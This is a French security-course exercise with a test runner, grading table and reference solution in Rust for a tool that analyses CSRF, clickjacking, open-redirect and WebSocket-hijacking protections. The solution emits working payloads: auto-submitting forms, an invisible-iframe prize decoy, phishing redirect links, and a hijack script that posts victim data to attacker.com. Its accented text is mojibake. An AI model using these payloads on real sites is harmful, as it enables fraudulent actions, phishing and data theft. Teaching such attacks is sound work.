# Exercice 3.3.8-a : client_side_attack_simulator

**Module :**
3.3.8 â€” Client-Side Attacks

**Concept :**
a â€” Client-Side Attack Simulator (CSRF, Clickjacking, Open Redirect, CSWSH)

**DifficultÃ© :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜†â˜† (7/10)

**Type :**
pratique

**Tiers :**
2 â€” MÃ©lange (concepts a + b + c + d : CSRF + Clickjacking + Open Redirect + WebSocket)

**Langage :**
Rust Edition 2024

**PrÃ©requis :**
- HTTP cookies et sessions
- Same-Origin Policy
- HTML/JavaScript basics
- HTTP headers (Origin, Referer)

**Domaines :**
Net, Encodage

**DurÃ©e estimÃ©e :**
240 min

**XP Base :**
300

**ComplexitÃ© :**
T2 O(n) Ã— S2 O(n)

---

## ğŸ“ SECTION 1 : PROTOTYPE & CONSIGNE

### 1.1 Obligations

**Fichier Ã  rendre :**
`client_side_attack_simulator.rs`

**Fonctions autorisÃ©es :**
- `serde_json` pour le parsing JSON
- `html_escape` pour l'Ã©chappement HTML
- Fonctions standard Rust

**Fonctions interdites :**
- ExÃ©cution de code JavaScript rÃ©el
- RequÃªtes HTTP sortantes

---

### 1.2 Consigne

#### ğŸ¬ CONTEXTE FUN â€” "Mr. Robot"

*"People always make the best exploits. I've never found it hard to hack most people. If you listen to them, watch them, their vulnerabilities are like a neon sign."* â€” Elliot Alderson

Tu es **Elliot Alderson**, le gÃ©nie hacker de fsociety. Tu ne hackes pas seulement les serveurs â€” tu hackes les **navigateurs** et les **actions des utilisateurs**. Les attaques cÃ´tÃ© serveur sont bruyantes, dÃ©tectables. Les attaques client-side sont **silencieuses**, **invisibles**, et exploitent la **confiance** entre l'utilisateur et le site.

**Ton arsenal de manipulation :**
- **CSRF** : Forcer le navigateur de la victime Ã  faire une action non dÃ©sirÃ©e
- **Clickjacking** : Cacher une action malveillante sous un clic innocent
- **Open Redirect** : Rediriger vers un site de phishing avec l'URL d'un site lÃ©gitime
- **CSWSH** : Hijacker les WebSockets pour une communication bidirectionnelle

E Corp pense Ãªtre protÃ©gÃ©e. Mais tu sais que la **sÃ©curitÃ© cÃ´tÃ© client est un chÃ¢teau de cartes**. Un cookie mal configurÃ©, un header manquant, un frame non protÃ©gÃ© â€” et tout s'effondre.

*"Control is an illusion."*

---

#### 1.2.2 Ã‰noncÃ© AcadÃ©mique

**Ta mission :**

Ã‰crire une fonction `client_side_attack_simulator` qui analyse les protections d'une application et gÃ©nÃ¨re des exploits pour diffÃ©rentes attaques client-side.

**EntrÃ©e (JSON) :**
- `attack_type` : Type d'attaque (CSRF, CLICKJACKING, OPEN_REDIRECT, CSWSH)
- `target_request` : RequÃªte cible Ã  exploiter
  - `method` : MÃ©thode HTTP
  - `url` : URL cible
  - `body` : Corps de la requÃªte
  - `content_type` : Type de contenu
- `protections` : Protections en place
  - `csrf_token` : BoolÃ©en (prÃ©sence de token anti-CSRF)
  - `samesite_cookie` : Valeur (None, Lax, Strict)
  - `origin_check` : BoolÃ©en (vÃ©rification Origin/Referer)
  - `x_frame_options` : Valeur (DENY, SAMEORIGIN, null)
  - `csp_frame_ancestors` : Directive CSP

**Sortie (JSON) :**
- `attack_analysis` : Analyse des protections
  - `protection_status` : Statut de chaque protection
  - `exploitable` : BoolÃ©en
  - `conditions` : Conditions d'exploitation
- `exploit_code` : Code HTML/JS de l'exploit
- `bypass_technique` : Technique de contournement si applicable
- `remediation` : Recommandations de correction

**Contraintes :**
- GÃ©nÃ©rer du code HTML/JS valide et fonctionnel
- Adapter l'exploit aux protections en place
- Proposer des bypass si certaines protections sont partielles
- Retourner un JSON valide mÃªme si l'attaque n'est pas possible

**Exemples :**

| Type | Protections | RÃ©sultat |
|------|-------------|----------|
| CSRF | token=false, samesite=None | Exploitable, form auto-submit |
| CSRF | token=false, samesite=Lax | Bypass via GET si acceptÃ© |
| CLICKJACKING | x-frame=null | Exploitable, iframe overlay |
| OPEN_REDIRECT | no validation | Exploitable, redirect chain |

---

### 1.3 Prototype

```rust
/// Client-Side Attack Simulator - Elliot's Invisible Arsenal
///
/// Analyse les protections et gÃ©nÃ¨re des exploits pour CSRF, Clickjacking,
/// Open Redirect et WebSocket Hijacking.
///
/// # Arguments
/// * `input_json` - Configuration JSON avec attack_type, target_request, protections
///
/// # Returns
/// * JSON string avec attack_analysis, exploit_code, bypass_technique, remediation
pub fn client_side_attack_simulator(input_json: &str) -> String
```

---

## ğŸ’¡ SECTION 2 : LE SAVIEZ-VOUS ?

### 2.1 CSRF : L'attaque "deputy confusion"

CSRF exploite le fait que le navigateur envoie **automatiquement** les cookies avec chaque requÃªte vers un domaine. Si tu es connectÃ© Ã  ta banque et que tu visites un site malveillant, ce site peut faire une requÃªte vers ta banque â€” **avec tes cookies**.

Historique cÃ©lÃ¨bre : En 2008, des chercheurs ont dÃ©montrÃ© qu'ils pouvaient transfÃ©rer de l'argent depuis les comptes bancaires de millions d'utilisateurs via un simple email avec une image :
```html
<img src="https://bank.com/transfer?to=attacker&amount=10000">
```

### 2.2 SameSite : La protection moderne

L'attribut `SameSite` sur les cookies est la meilleure dÃ©fense contre CSRF :
- **Strict** : Cookie jamais envoyÃ© en cross-site
- **Lax** : EnvoyÃ© pour GET de navigation top-level uniquement
- **None** : Toujours envoyÃ© (requiert Secure)

**PiÃ¨ge :** Lax permet les GET, donc un serveur qui accepte POST et GET est vulnÃ©rable.

### 2.3 Clickjacking : L'art de l'invisibilitÃ©

En 2008, Jeremiah Grossman et Robert Hansen ont prÃ©sentÃ© "Clickjacking" Ã  l'OWASP AppSec. Ils ont dÃ©montrÃ© qu'on pouvait voler des clics sur Facebook, activer des webcams via Flash, etc.

**Technique :** Une iframe transparente (opacity: 0) placÃ©e au-dessus d'un bouton visible.

---

### 2.5 DANS LA VRAIE VIE

| MÃ©tier | Utilisation |
|--------|-------------|
| **Pentester** | GÃ©nÃ¨re des PoC CSRF/Clickjacking pour chaque application |
| **Bug Bounty** | CSRF sur actions sensibles = $500-$10,000 |
| **Security Engineer** | Configure SameSite, CSP frame-ancestors |
| **Frontend Dev** | ImplÃ©mente les protections anti-CSRF |
| **Red Team** | Utilise ces attaques dans les simulations |

---

## ğŸ–¥ï¸ SECTION 3 : EXEMPLE D'UTILISATION

### 3.0 Session bash

```bash
$ ls
client_side_attack_simulator.rs  main.rs  Cargo.toml

$ cargo build --release

$ cargo run
Test 1 - CSRF (no protections):
  Status: EXPLOITABLE
  Generated: <form action="..." method="POST">...</form>

Test 2 - CSRF (SameSite=Lax):
  Status: PARTIALLY PROTECTED
  Bypass: Convert POST to GET
  Generated: <img src="...?to=attacker&amount=1000">

Test 3 - Clickjacking (no X-Frame-Options):
  Status: EXPLOITABLE
  Generated: <iframe src="..." style="opacity:0">

Test 4 - Open Redirect (no validation):
  Status: EXPLOITABLE
  Generated: https://legit.com/redirect?url=https://phishing.com

Test 5 - CSWSH (no Origin check):
  Status: EXPLOITABLE
  Generated: WebSocket hijacking script

All attack simulations completed!
```

---

### 3.1 ğŸ”¥ BONUS AVANCÃ‰ (OPTIONNEL)

**DifficultÃ© Bonus :**
â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜…â˜†â˜† (8/10)

**RÃ©compense :**
XP Ã—3

#### 3.1.1 Consigne Bonus

**ğŸ¬ Phase 2 de l'opÃ©ration**

Elliot a besoin d'attaques plus sophistiquÃ©es :

1. **CSRF avec JSON body** : Content-Type application/json bypass
2. **Double-clickjacking** : Bypass des protections frame-busting
3. **OAuth redirect chain** : ChaÃ®ner plusieurs redirections
4. **Login CSRF** : Forcer connexion avec compte attaquant

**EntrÃ©e additionnelle :**
```json
{
  "advanced_options": {
    "json_csrf": true,
    "frame_busting_bypass": true,
    "oauth_redirect_chain": ["url1", "url2", "url3"]
  }
}
```

---

## âœ…âŒ SECTION 4 : ZONE CORRECTION

### 4.1 Moulinette

| Test | EntrÃ©e | Sortie Attendue | Points |
|------|--------|-----------------|--------|
| `test_csrf_no_protection` | CSRF sans token ni SameSite | Exploit form | 15 |
| `test_csrf_samesite_lax` | CSRF avec SameSite=Lax | Bypass via GET | 15 |
| `test_csrf_samesite_strict` | CSRF avec SameSite=Strict | Non exploitable | 10 |
| `test_clickjacking_no_xframe` | Pas de X-Frame-Options | Exploit iframe | 15 |
| `test_clickjacking_sameorigin` | X-Frame: SAMEORIGIN | Partiellement protÃ©gÃ© | 10 |
| `test_open_redirect` | URL param sans validation | Payload redirect | 10 |
| `test_cswsh` | WebSocket sans Origin check | Exploit WS | 10 |
| `test_remediation_generated` | Toute attaque | Remediation prÃ©sente | 10 |
| `test_invalid_input` | JSON invalide | Erreur gracieuse | 5 |
| `test_unknown_attack` | attack_type inconnu | Erreur descriptive | 5 |

**Total : 105 points**

---

### 4.2 main.rs de test

```rust
use serde_json::{json, Value};

mod client_side_attack_simulator;
use client_side_attack_simulator::client_side_attack_simulator;

fn main() {
    println!("=== Client-Side Attack Simulator - Test Runner ===\n");

    // Test 1: CSRF without protections
    let test_csrf = json!({
        "attack_type": "CSRF",
        "target_request": {
            "method": "POST",
            "url": "https://bank.com/transfer",
            "body": "to=attacker&amount=1000",
            "content_type": "application/x-www-form-urlencoded"
        },
        "protections": {
            "csrf_token": false,
            "samesite_cookie": "None",
            "origin_check": false
        }
    });

    let result = client_side_attack_simulator(&test_csrf.to_string());
    let parsed: Value = serde_json::from_str(&result).expect("Invalid JSON");

    assert!(parsed["attack_analysis"]["exploitable"].as_bool().unwrap_or(false));
    assert!(parsed["exploit_code"].as_str().unwrap().contains("<form"));
    println!("âœ“ Test 1 - CSRF (no protection): PASSED");

    // Test 2: CSRF with SameSite=Lax
    let test_csrf_lax = json!({
        "attack_type": "CSRF",
        "target_request": {
            "method": "POST",
            "url": "https://bank.com/transfer",
            "body": "to=attacker&amount=1000",
            "content_type": "application/x-www-form-urlencoded"
        },
        "protections": {
            "csrf_token": false,
            "samesite_cookie": "Lax",
            "origin_check": false
        }
    });

    let result = client_side_attack_simulator(&test_csrf_lax.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["bypass_technique"].as_str().is_some());
    println!("âœ“ Test 2 - CSRF (SameSite=Lax bypass): PASSED");

    // Test 3: Clickjacking
    let test_clickjack = json!({
        "attack_type": "CLICKJACKING",
        "target_request": {
            "url": "https://bank.com/settings/delete-account"
        },
        "protections": {
            "x_frame_options": null,
            "csp_frame_ancestors": null
        }
    });

    let result = client_side_attack_simulator(&test_clickjack.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["exploit_code"].as_str().unwrap().contains("<iframe"));
    println!("âœ“ Test 3 - Clickjacking: PASSED");

    // Test 4: Open Redirect
    let test_redirect = json!({
        "attack_type": "OPEN_REDIRECT",
        "target_request": {
            "url": "https://legit.com/redirect",
            "params": {"next": "user_controlled"}
        },
        "protections": {
            "redirect_validation": "none"
        }
    });

    let result = client_side_attack_simulator(&test_redirect.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["attack_analysis"]["exploitable"].as_bool().unwrap_or(false));
    println!("âœ“ Test 4 - Open Redirect: PASSED");

    // Test 5: CSWSH
    let test_cswsh = json!({
        "attack_type": "CSWSH",
        "target_request": {
            "url": "wss://bank.com/socket"
        },
        "protections": {
            "origin_check": false
        }
    });

    let result = client_side_attack_simulator(&test_cswsh.to_string());
    let parsed: Value = serde_json::from_str(&result).unwrap();

    assert!(parsed["exploit_code"].as_str().unwrap().contains("WebSocket"));
    println!("âœ“ Test 5 - CSWSH: PASSED");

    println!("\n=== All Tests Passed! Mr. Robot approves. ===");
}
```

---

### 4.3 Solution de rÃ©fÃ©rence

```rust
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// STRUCTURES
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

#[derive(Debug, Deserialize)]
struct Input {
    attack_type: String,
    target_request: Option<TargetRequest>,
    protections: Option<Protections>,
}

#[derive(Debug, Deserialize)]
struct TargetRequest {
    method: Option<String>,
    url: String,
    body: Option<String>,
    content_type: Option<String>,
    params: Option<HashMap<String, String>>,
}

#[derive(Debug, Deserialize)]
struct Protections {
    csrf_token: Option<bool>,
    samesite_cookie: Option<String>,
    origin_check: Option<bool>,
    x_frame_options: Option<String>,
    csp_frame_ancestors: Option<String>,
    redirect_validation: Option<String>,
}

#[derive(Debug, Serialize)]
struct Output {
    attack_analysis: AttackAnalysis,
    exploit_code: String,
    bypass_technique: Option<String>,
    remediation: HashMap<String, String>,
}

#[derive(Debug, Serialize)]
struct AttackAnalysis {
    protection_status: HashMap<String, String>,
    exploitable: bool,
    conditions: String,
    cwe: String,
    owasp: String,
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CSRF ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_csrf(request: &TargetRequest, protections: &Protections) -> Output {
    let mut protection_status = HashMap::new();
    let mut exploitable = true;
    let mut bypass_technique = None;
    let mut conditions = Vec::new();

    // Check CSRF token
    let has_token = protections.csrf_token.unwrap_or(false);
    if has_token {
        protection_status.insert("csrf_token".to_string(), "PRESENT - Protected".to_string());
        exploitable = false;
    } else {
        protection_status.insert("csrf_token".to_string(), "ABSENT - Vulnerable".to_string());
    }

    // Check SameSite cookie
    let samesite = protections.samesite_cookie.as_deref().unwrap_or("None");
    match samesite.to_lowercase().as_str() {
        "strict" => {
            protection_status.insert(
                "samesite".to_string(),
                "Strict - Protected against cross-site requests".to_string()
            );
            exploitable = false;
        }
        "lax" => {
            protection_status.insert(
                "samesite".to_string(),
                "Lax - Partial protection (blocks cross-site POST)".to_string()
            );
            let method = request.method.as_deref().unwrap_or("GET");
            if method.to_uppercase() == "POST" {
                conditions.push("POST blocked by SameSite=Lax".to_string());
                bypass_technique = Some(
                    "Convert POST to GET if server accepts both methods. \
                     Or use top-level navigation (window.location = ...)".to_string()
                );
            }
        }
        _ => {
            protection_status.insert(
                "samesite".to_string(),
                "None or absent - Vulnerable".to_string()
            );
        }
    }

    // Check Origin validation
    let origin_check = protections.origin_check.unwrap_or(false);
    if origin_check {
        protection_status.insert(
            "origin_check".to_string(),
            "PRESENT - Validates Origin/Referer".to_string()
        );
        exploitable = false;
    } else {
        protection_status.insert(
            "origin_check".to_string(),
            "ABSENT - No Origin/Referer validation".to_string()
        );
    }

    // Generate exploit code
    let exploit_code = if exploitable || bypass_technique.is_some() {
        generate_csrf_exploit(request, samesite)
    } else {
        "<!-- Attack not possible with current protections -->".to_string()
    };

    // Remediation
    let mut remediation = HashMap::new();
    remediation.insert(
        "csrf_token".to_string(),
        "Implement synchronizer token pattern: generate random token per session, \
         include in forms, validate on server".to_string()
    );
    remediation.insert(
        "samesite_cookie".to_string(),
        "Set SameSite=Strict on session cookies. Use Lax only if cross-site GET is needed".to_string()
    );
    remediation.insert(
        "origin_check".to_string(),
        "Validate Origin header matches expected domain. Fallback to Referer if Origin absent".to_string()
    );

    Output {
        attack_analysis: AttackAnalysis {
            protection_status,
            exploitable: exploitable || bypass_technique.is_some(),
            conditions: if conditions.is_empty() {
                "Standard CSRF conditions apply".to_string()
            } else {
                conditions.join("; ")
            },
            cwe: "CWE-352".to_string(),
            owasp: "A01:2021 - Broken Access Control".to_string(),
        },
        exploit_code,
        bypass_technique,
        remediation,
    }
}

fn generate_csrf_exploit(request: &TargetRequest, samesite: &str) -> String {
    let method = request.method.as_deref().unwrap_or("GET");
    let url = &request.url;
    let body = request.body.as_deref().unwrap_or("");

    // If SameSite=Lax and POST, generate GET-based exploit
    if samesite.to_lowercase() == "lax" && method.to_uppercase() == "POST" {
        let params = body.replace("&", "&amp;");
        return format!(
            r#"<!-- CSRF Exploit - GET bypass for SameSite=Lax -->
<html>
<head><title>Loading...</title></head>
<body>
<!-- Method 1: Image tag (hidden GET request) -->
<img src="{}?{}" style="display:none">

<!-- Method 2: Link click (top-level navigation) -->
<a href="{}?{}" id="link">Click here to continue</a>
<script>
// Auto-click after brief delay
setTimeout(function() {{
    document.getElementById('link').click();
}}, 100);
</script>
</body>
</html>"#,
            url, params, url, params
        );
    }

    // Standard form-based CSRF
    let inputs: String = body
        .split('&')
        .filter(|p| !p.is_empty())
        .map(|param| {
            let parts: Vec<&str> = param.splitn(2, '=').collect();
            let name = parts.get(0).unwrap_or(&"");
            let value = parts.get(1).unwrap_or(&"");
            format!(r#"<input type="hidden" name="{}" value="{}">"#, name, value)
        })
        .collect::<Vec<_>>()
        .join("\n    ");

    format!(
        r#"<!-- CSRF Exploit - Auto-submitting form -->
<html>
<head><title>Loading...</title></head>
<body>
<form id="csrf_form" action="{}" method="{}">
    {}
</form>
<script>
document.getElementById('csrf_form').submit();
</script>
</body>
</html>"#,
        url, method, inputs
    )
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CLICKJACKING ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_clickjacking(request: &TargetRequest, protections: &Protections) -> Output {
    let mut protection_status = HashMap::new();
    let mut exploitable = true;

    // Check X-Frame-Options
    let xfo = protections.x_frame_options.as_deref();
    match xfo {
        Some("DENY") => {
            protection_status.insert(
                "x_frame_options".to_string(),
                "DENY - Cannot be framed".to_string()
            );
            exploitable = false;
        }
        Some("SAMEORIGIN") => {
            protection_status.insert(
                "x_frame_options".to_string(),
                "SAMEORIGIN - Can only be framed by same origin".to_string()
            );
            exploitable = false; // From different origin
        }
        _ => {
            protection_status.insert(
                "x_frame_options".to_string(),
                "ABSENT - Page can be framed".to_string()
            );
        }
    }

    // Check CSP frame-ancestors
    let csp = protections.csp_frame_ancestors.as_deref();
    match csp {
        Some(directive) if directive.contains("'none'") => {
            protection_status.insert(
                "csp_frame_ancestors".to_string(),
                format!("{} - Cannot be framed", directive)
            );
            exploitable = false;
        }
        Some(directive) if directive.contains("'self'") => {
            protection_status.insert(
                "csp_frame_ancestors".to_string(),
                format!("{} - Only same origin can frame", directive)
            );
            exploitable = false;
        }
        Some(directive) => {
            protection_status.insert(
                "csp_frame_ancestors".to_string(),
                format!("{} - Limited framing allowed", directive)
            );
        }
        None => {
            protection_status.insert(
                "csp_frame_ancestors".to_string(),
                "ABSENT - No CSP frame restriction".to_string()
            );
        }
    }

    let url = &request.url;

    let exploit_code = if exploitable {
        format!(
            r#"<!-- Clickjacking Exploit - Invisible iframe overlay -->
<html>
<head>
<title>Win a Free iPhone!</title>
<style>
.decoy {{
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
    font-size: 24px;
    cursor: pointer;
}}
iframe {{
    position: absolute;
    top: 70px;  /* Align with target button */
    left: 80px;
    width: 500px;
    height: 300px;
    opacity: 0.0001;  /* Nearly invisible */
    z-index: 2;
    border: none;
}}
</style>
</head>
<body>
<h1>Congratulations! You've won!</h1>
<button class="decoy">CLAIM YOUR PRIZE</button>
<iframe src="{}"></iframe>

<!-- Debug: set opacity to 0.5 to see the overlay -->
</body>
</html>"#,
            url
        )
    } else {
        "<!-- Clickjacking not possible - page protected by X-Frame-Options or CSP -->".to_string()
    };

    let mut remediation = HashMap::new();
    remediation.insert(
        "x_frame_options".to_string(),
        "Add X-Frame-Options: DENY (or SAMEORIGIN if embedding needed)".to_string()
    );
    remediation.insert(
        "csp_frame_ancestors".to_string(),
        "Add Content-Security-Policy: frame-ancestors 'none' (or 'self')".to_string()
    );
    remediation.insert(
        "javascript".to_string(),
        "Frame-busting JS is NOT reliable - can be bypassed. Use headers instead.".to_string()
    );

    Output {
        attack_analysis: AttackAnalysis {
            protection_status,
            exploitable,
            conditions: "User must click on the decoy element".to_string(),
            cwe: "CWE-1021".to_string(),
            owasp: "A01:2021 - Broken Access Control".to_string(),
        },
        exploit_code,
        bypass_technique: None,
        remediation,
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// OPEN REDIRECT ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_open_redirect(request: &TargetRequest, protections: &Protections) -> Output {
    let mut protection_status = HashMap::new();
    let mut exploitable = true;

    let validation = protections.redirect_validation.as_deref().unwrap_or("none");

    match validation {
        "strict" | "whitelist" => {
            protection_status.insert(
                "redirect_validation".to_string(),
                "Strict whitelist - Only approved URLs".to_string()
            );
            exploitable = false;
        }
        "domain" => {
            protection_status.insert(
                "redirect_validation".to_string(),
                "Domain check - May be bypassable".to_string()
            );
            // Could still be exploitable with subdomain tricks
        }
        _ => {
            protection_status.insert(
                "redirect_validation".to_string(),
                "NONE - Any URL accepted".to_string()
            );
        }
    }

    let url = &request.url;
    let phishing_url = "https://evil-phishing.com/login";

    let exploit_code = if exploitable {
        format!(
            r#"<!-- Open Redirect Exploit -->

<!-- Direct exploit - send this link to victim -->
Phishing link: {}?next={}

<!-- Encoded versions to bypass basic filters -->
URL encoded: {}?next={}
Double encoded: {}?next={}

<!-- Data URI (some browsers) -->
{}?next=data:text/html,<script>location='https://evil.com'</script>

<!-- Usage in phishing email -->
<a href="{}?next={}">
    Click here to verify your account
</a>"#,
            url, phishing_url,
            url, urlencoding::encode(phishing_url),
            url, urlencoding::encode(&urlencoding::encode(phishing_url).to_string()),
            url,
            url, phishing_url
        )
    } else {
        "<!-- Open redirect not exploitable - strict validation in place -->".to_string()
    };

    let mut remediation = HashMap::new();
    remediation.insert(
        "validation".to_string(),
        "Use a strict whitelist of allowed redirect URLs".to_string()
    );
    remediation.insert(
        "relative_only".to_string(),
        "Only allow relative paths, reject absolute URLs".to_string()
    );
    remediation.insert(
        "indirect".to_string(),
        "Use indirect references (redirect_id=1) mapped server-side".to_string()
    );

    Output {
        attack_analysis: AttackAnalysis {
            protection_status,
            exploitable,
            conditions: "User clicks on the crafted link".to_string(),
            cwe: "CWE-601".to_string(),
            owasp: "A01:2021 - Broken Access Control".to_string(),
        },
        exploit_code,
        bypass_technique: if validation == "domain" {
            Some("Try subdomain: legitimate.com.attacker.com or legitimate.com@attacker.com".to_string())
        } else {
            None
        },
        remediation,
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// CSWSH (Cross-Site WebSocket Hijacking) ANALYSIS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

fn analyze_cswsh(request: &TargetRequest, protections: &Protections) -> Output {
    let mut protection_status = HashMap::new();
    let mut exploitable = true;

    let origin_check = protections.origin_check.unwrap_or(false);

    if origin_check {
        protection_status.insert(
            "origin_check".to_string(),
            "PRESENT - Origin header validated".to_string()
        );
        exploitable = false;
    } else {
        protection_status.insert(
            "origin_check".to_string(),
            "ABSENT - Any origin can connect".to_string()
        );
    }

    let ws_url = &request.url;

    let exploit_code = if exploitable {
        format!(
            r#"<!-- Cross-Site WebSocket Hijacking Exploit -->
<html>
<head><title>WebSocket Hijacker</title></head>
<body>
<h1>Loading...</h1>
<div id="output"></div>
<script>
// Connect to victim's WebSocket with their session
var ws = new WebSocket('{}');

ws.onopen = function() {{
    console.log('[+] WebSocket connected with victim session');
    document.getElementById('output').innerHTML += '<p>Connected!</p>';

    // Send malicious commands as the victim
    ws.send(JSON.stringify({{
        action: 'transfer',
        to: 'attacker_account',
        amount: 10000
    }}));
}};

ws.onmessage = function(event) {{
    console.log('[+] Received:', event.data);
    document.getElementById('output').innerHTML += '<p>Data: ' + event.data + '</p>';

    // Exfiltrate data to attacker server
    fetch('https://attacker.com/collect', {{
        method: 'POST',
        body: event.data
    }});
}};

ws.onerror = function(error) {{
    console.log('[-] Error:', error);
}};
</script>
</body>
</html>"#,
            ws_url
        )
    } else {
        "<!-- CSWSH not possible - Origin header is validated -->".to_string()
    };

    let mut remediation = HashMap::new();
    remediation.insert(
        "origin_check".to_string(),
        "Validate Origin header on WebSocket handshake. Reject if not from allowed domains.".to_string()
    );
    remediation.insert(
        "authentication".to_string(),
        "Require authentication token in WebSocket connection URL or first message".to_string()
    );
    remediation.insert(
        "csrf_token".to_string(),
        "Include CSRF token in WebSocket URL as query parameter".to_string()
    );

    Output {
        attack_analysis: AttackAnalysis {
            protection_status,
            exploitable,
            conditions: "Victim must be logged in and visit attacker's page".to_string(),
            cwe: "CWE-352".to_string(),
            owasp: "A01:2021 - Broken Access Control".to_string(),
        },
        exploit_code,
        bypass_technique: None,
        remediation,
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MAIN FUNCTION
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

pub fn client_side_attack_simulator(input_json: &str) -> String {
    let input: Input = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => {
            return json!({
                "error": format!("Invalid input JSON: {}", e),
                "attack_analysis": null,
                "exploit_code": "",
                "remediation": {}
            }).to_string();
        }
    };

    let request = input.target_request.unwrap_or(TargetRequest {
        method: Some("GET".to_string()),
        url: "https://example.com".to_string(),
        body: None,
        content_type: None,
        params: None,
    });

    let protections = input.protections.unwrap_or(Protections {
        csrf_token: None,
        samesite_cookie: None,
        origin_check: None,
        x_frame_options: None,
        csp_frame_ancestors: None,
        redirect_validation: None,
    });

    let output = match input.attack_type.to_uppercase().as_str() {
        "CSRF" => analyze_csrf(&request, &protections),
        "CLICKJACKING" => analyze_clickjacking(&request, &protections),
        "OPEN_REDIRECT" => analyze_open_redirect(&request, &protections),
        "CSWSH" => analyze_cswsh(&request, &protections),
        unknown => {
            return json!({
                "error": format!("Unknown attack type: {}. Supported: CSRF, CLICKJACKING, OPEN_REDIRECT, CSWSH", unknown),
                "attack_analysis": null,
                "exploit_code": "",
                "remediation": {}
            }).to_string();
        }
    };

    serde_json::to_string_pretty(&output).unwrap_or_else(|e| {
        json!({ "error": format!("Serialization error: {}", e) }).to_string()
    })
}

// URL encoding helper
mod urlencoding {
    pub fn encode(input: &str) -> String {
        input.chars()
            .map(|c| match c {
                'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '.' | '~' => c.to_string(),
                _ => format!("%{:02X}", c as u8),
            })
            .collect()
    }
}
```

---

### 4.9 spec.json

```json
{
  "name": "client_side_attack_simulator",
  "language": "rust",
  "version": "2024",
  "type": "pratique",
  "tier": 2,
  "tags": ["csrf", "clickjacking", "open-redirect", "client-side", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "client_side_attack_simulator",
    "prototype": "pub fn client_side_attack_simulator(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [{"name": "input_json", "type": "&str"}]
  },

  "driver": {
    "reference_file": "solutions/client_side_attack_simulator_ref.rs",

    "edge_cases": [
      {
        "name": "csrf_no_protection",
        "args": ["{\"attack_type\":\"CSRF\",\"target_request\":{\"method\":\"POST\",\"url\":\"https://bank.com/transfer\",\"body\":\"to=attacker&amount=1000\"},\"protections\":{\"csrf_token\":false,\"samesite_cookie\":\"None\"}}"],
        "expected_contains": "exploitable\":true",
        "is_trap": true
      },
      {
